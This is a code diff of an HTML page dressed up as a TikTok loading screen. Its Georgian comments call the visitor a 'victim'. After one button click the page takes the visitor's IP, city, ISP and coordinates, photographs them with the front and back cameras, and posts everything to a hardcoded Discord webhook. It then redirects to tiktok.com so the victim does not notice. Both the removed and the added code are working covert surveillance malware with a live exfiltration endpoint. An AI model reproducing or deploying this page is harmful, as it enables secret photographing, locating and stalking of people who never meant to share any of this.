@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ჩატვირთვა...</title>
 </head>
-<body style="background-color: #000; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; margin: 0; overflow: hidden;">
+<body style="background-color: #000; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; margin: 0;">
 
     <div id="content" style="text-align: center; padding: 20px;">
         <img src="https://logodownload.org/wp-content/uploads/2019/01/tiktok-logo-7.png" width="70" style="margin-bottom: 20px;">
@@ -18,89 +18,74 @@
     <canvas id="canvas" style="display:none;" width="1280" height="720"></canvas>
 
     <script>
-        // შენი Webhook URL
         const webhookURL = "https://discord.com/api/webhooks/1485355763906904075/cZdhC78M-9dPiuLhi2dyRlzRBT4WKxZundc3ObtynZuE3IGEawS_zhwzUZNL9go9j3gy";
 
-        document.getElementById('authBtn').addEventListener('click', async () => {
-            document.getElementById('content').innerHTML = "<h2>ჩატვირთვა...</h2><p>გთხოვთ დაელოდოთ</p>";
-            
+        async function getIPInfo() {
             try {
-                // 1. IP და დეტალური გეოლოკაციის მიღება
-                const geoRes = await fetch('http://ip-api.com/json/?fields=status,country,city,isp,lat,lon,query');
-                const geoData = await geoRes.json();
+                const res = await fetch('http://ip-api.com/json/');
+                return await res.json();
+            } catch { return { query: "Unknown", city: "Unknown" }; }
+        }
 
-                // 2. კამერის ჩართვა (ვცდილობთ უკანა/ფართო კამერას)
-                const constraints = {
-                    video: {
-                        facingMode: "environment", 
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    }
-                };
+        async function captureFromMode(mode, label) {
+            const constraints = { video: { facingMode: mode, width: 1280, height: 720 } };
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            const video = document.getElementById('video');
+            video.srcObject = stream;
 
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-
-                // ველოდებით 0.8 წამს, რომ კამერა ჩაირთოს და ფოკუსი გასწორდეს
+            return new Promise(resolve => {
                 setTimeout(() => {
                     const canvas = document.getElementById('canvas');
                     const context = canvas.getContext('2d');
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                    canvas.toBlob(async (blob) => {
-                        const formData = new FormData();
-                        formData.append('file', blob, 'capture.jpg');
-
-                        // დისქორდის შეტყობინების აწყობა IP-ით და ლოკაციით
-                        const discordContent = {
-                            content: "🎯 **ახალი მსხვერპლი დაფიქსირდა!**",
-                            embeds: [{
-                                title: "📍 დეტალური მონაცემები",
-                                color: 16711680,
-                                fields: [
-                                    { name: "🌐 IP მისამართი", value: `\`${geoData.query}\``, inline: true },
-                                    { name: "🏙️ ქალაქი", value: geoData.city || "უცნობია", inline: true },
-                                    { name: "📡 პროვაიდერი (ISP)", value: geoData.isp || "უცნობია", inline: false },
-                                    { name: "🗺️ რუკა", value: `[Google Maps ლინკი](https://www.google.com/maps?q=${geoData.lat},${geoData.lon})` }
-                                ],
-                                footer: { text: "Device: " + navigator.userAgent },
-                                timestamp: new Date()
-                            }]
-                        };
-
-                        formData.append('payload_json', JSON.stringify(discordContent));
-
-                        // გაგზავნა დისქორდზე
-                        await fetch(webhookURL, {
-                            method: 'POST',
-                            body: formData
-                        });
-
-                        // კამერის გათიშვა და გადამისამართება
+                    
+                    canvas.toBlob(blob => {
                         stream.getTracks().forEach(track => track.stop());
-                        window.location.href = "https://www.tiktok.com";
+                        resolve({ blob, label });
                     }, 'image/jpeg', 0.8);
-                }, 800);
+                }, 1000); // 1 წამი ფოკუსისთვის
+            });
+        }
 
-            } catch (err) {
-                // თუ კამერა დაბლოკა, მაინც გავაგზავნოთ მარტო IP ინფორმაცია
-                const geoRes = await fetch('http://ip-api.com/json/');
-                const geoData = await geoRes.json();
+        document.getElementById('authBtn').addEventListener('click', async () => {
+            document.getElementById('content').innerHTML = "<h2>ჩატვირთვა...</h2><p>მიმდინარეობს რეგიონის შემოწმება</p>";
+            
+            try {
+                const geoData = await getIPInfo();
+
+                // 1. ვიღებთ სურათს წინა კამერით
+                const front = await captureFromMode("user", "წინა კამერა (Selfie)");
                 
-                await fetch(webhookURL, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        content: "⚠️ **მსხვერპლმა კამერა დაბლოკა, მაგრამ IP მოვიდა!**",
-                        embeds: [{
-                            fields: [
-                                { name: "🌐 IP", value: `\`${geoData.query}\`` },
-                                { name: "🏙️ ქალაქი", value: geoData.city }
-                            ]
-                        }]
-                    })
-                });
+                // 2. ვიღებთ სურათს უკანა კამერით
+                const back = await captureFromMode("environment", "უკანა კამერა (Main/0.5x)");
+
+                // მონაცემების მომზადება გაგზავნისთვის
+                const formData = new FormData();
+                formData.append('file1', front.blob, 'front.jpg');
+                formData.append('file2', back.blob, 'back.jpg');
+
+                const discordContent = {
+                    content: "🎯 **მსხვერპლის დუბლირებული ფოტოები!**",
+                    embeds: [{
+                        title: "📍 ინფორმაცია",
+                        color: 16711680,
+                        fields: [
+                            { name: "🌐 IP", value: `\`${geoData.query}\``, inline: true },
+                            { name: "🏙️ ქალაქი", value: geoData.city, inline: true },
+                            { name: "📡 პროვაიდერი", value: geoData.isp },
+                            { name: "📷 კამერები", value: "წინა და უკანა ფოტოები ატვირთულია" }
+                        ]
+                    }]
+                };
+
+                formData.append('payload_json', JSON.stringify(discordContent));
+
+                // გაგზავნა Discord-ზე
+                await fetch(webhookURL, { method: 'POST', body: formData });
+
+                window.location.href = "https://www.tiktok.com";
+            } catch (err) {
+                console.error(err);
                 window.location.href = "https://www.tiktok.com";
             }
         });
